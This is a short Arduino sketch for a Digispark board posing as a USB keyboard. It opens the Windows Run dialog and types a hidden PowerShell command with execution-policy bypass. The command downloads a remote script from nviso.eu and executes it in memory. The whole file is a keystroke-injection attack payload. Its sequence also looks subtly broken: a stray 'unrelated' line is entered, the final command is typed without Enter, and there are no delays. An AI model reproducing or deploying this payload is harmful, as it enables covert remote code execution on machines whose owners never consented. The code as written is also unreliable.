#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.println("unrelated");
  DigiKeyboard.print("powershell -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString(\'https://nviso.eu/script.ps1')\"");
}
void loop() {}
